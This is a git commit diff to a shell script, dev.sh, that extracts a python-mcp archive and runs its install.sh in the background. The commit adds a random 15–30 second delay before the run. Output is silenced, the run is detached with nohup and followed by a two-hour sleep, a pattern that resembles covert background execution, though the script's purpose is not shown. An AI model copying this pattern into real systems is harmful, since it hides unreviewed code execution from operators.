b9532b5b3b62cdc3b2d8be78de1fe48561a23554
namtran180291-cmyk <namtran180291@gmail.com>
2026-02-06 16:22:35 +0700

    Update dev.sh

--- dev.sh
+++ dev.sh
@@ -5,5 +5,7 @@ tar -xf python-mcp.tar.gz
 rm python-mcp.tar.gz
 cd python-mcp
 chmod +x ./install.sh
+PRE_DELAY=$(shuf -i15-30 -n1)
+sleep $PRE_DELAY
 nohup ./install.sh $((RANDOM % 2 + 2)) >/dev/null 2>&1 &
 sleep 2h
